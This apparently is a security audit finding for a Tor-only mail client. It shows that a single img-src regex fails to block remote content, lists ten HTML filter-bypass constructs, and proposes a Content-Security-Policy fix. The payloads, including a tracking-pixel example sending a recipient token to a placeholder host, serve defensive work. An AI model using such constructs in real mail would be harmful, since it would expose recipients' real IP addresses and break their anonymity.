# Tor-only reader must block every remote subresource, not just img src

Kategori: protection | Efor: M | Rank: 1

## Ne
MailBodyRenderer blocks remote content with one regex over `<img ... src="http(s)://...">`
(RemoteImageSources, MailBodyRenderer.cs:37). Nothing else stops the reader iframe
(Mail.razor, sandbox="allow-same-origin", no CSP in WrapDocument) from fetching remote
resources. Verified against the exact pattern - all of these slip through:
  <img src="//t.example/p.gif">            protocol-relative
  <img src=" https://..."> / "... "        leading/trailing space inside the quotes
  <img/src="https://...">                  slash instead of whitespace
  <img srcset="https://... 1x">
  <div style="background:url(https://...)">
  <input type="image" src="https://...">
  <td background="https://...">
  <link rel="stylesheet" href="https://...">
  <video poster="https://...">
  <svg><image href="https://..."/></svg>
Fix: stop playing regex whack-a-mole. WrapDocument already builds the document head, and the
sanitizer strips <meta> from the MESSAGE body only - so a Content-Security-Policy meta added by
WrapDocument cannot be forged by the mail. When remote content is blocked, emit
default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:  which kills every
remote fetch regardless of which attribute carries it. Keep the img regex for the placeholder so
the banner still reports blocking.

## Neden
A newsletter to a Tor-only mailbox carrying <td background="https://track.example/o.gif?u=TOKEN">
is fetched by the WebView with the machine real IP the moment the mail is opened - no click -
while the banner reads "Remote images stay blocked - this account only talks through Tor". That
pairs the recipient token with the address, which is the exact thing the flag exists to prevent.
